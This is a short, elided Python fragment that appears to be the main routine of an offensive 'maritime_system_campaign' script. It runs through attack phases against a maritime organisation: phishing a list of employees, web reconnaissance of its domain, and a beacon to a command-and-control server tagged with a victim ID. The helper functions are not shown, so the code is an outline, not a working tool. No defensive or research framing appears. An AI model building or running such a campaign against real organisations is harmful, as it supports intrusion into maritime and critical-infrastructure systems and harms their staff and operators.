...
def main():
    """
    Main function to run the maritime_system_campaign campaign.
    """
    print(f"[*] Starting maritime_system_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("maritime_systems_employees.txt")
    run_tool("apt_web_recon.js", "--target maritime_systems.com")
    ...
    command_control.send_beacon(c2_server, "VICTIM-MARITIME_SYSTEMS-01")
